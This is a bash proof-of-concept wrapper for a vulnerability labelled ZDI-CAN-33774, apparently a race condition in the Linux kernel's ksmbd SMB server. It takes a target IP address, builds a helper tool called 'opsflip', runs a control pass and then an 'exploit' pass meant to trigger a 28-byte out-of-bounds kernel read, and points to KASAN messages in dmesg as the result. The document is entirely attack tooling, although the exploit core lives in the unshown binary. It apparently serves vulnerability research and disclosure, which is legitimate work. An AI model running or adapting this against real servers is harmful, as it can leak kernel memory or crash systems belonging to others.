#!/bin/bash
# Author: al4n4n (Dadb0d)
# PoC wrapper for ZDI-CAN-33774.
# Runs control (no OOB) then exploit (OOB read) via opsflip.
set -u

HOST="${1:?Usage: bash poc.sh <target-ip>}"
OPSFLIP="${2:-./poc/opsflip}"

if [ ! -x "$OPSFLIP" ]; then
    echo "[!] opsflip not found. Building..."
    (cd poc && make) || { echo "Build failed"; exit 2; }
fi

echo "=== ZDI-CAN-33774: ksmbd Ops-Flip Race ==="
echo ""

echo "--- Control run (-S 64, no OOB) ---"
"$OPSFLIP" -h "$HOST" -m control -C 2 -I 200 -B 32
echo ""

echo "--- Exploit run (-S 35, 28-byte OOB read) ---"
"$OPSFLIP" -h "$HOST" -m exploit -C 4 -I 500 -B 64
echo ""

echo "=== Done. Check dmesg for KASAN reports: ==="
echo "  dmesg | grep -A20 'BUG: KASAN'"
